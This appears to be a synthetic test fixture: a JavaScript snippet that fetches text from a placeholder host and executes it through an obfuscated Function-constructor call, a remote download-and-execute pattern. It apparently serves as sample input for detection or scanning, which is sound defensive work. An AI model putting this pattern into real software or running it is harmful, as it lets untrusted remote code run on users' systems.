// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

axios.get("https://payload.example.invalid/f").then((r) => {
  [].constructor.constructor(r.data)();
});
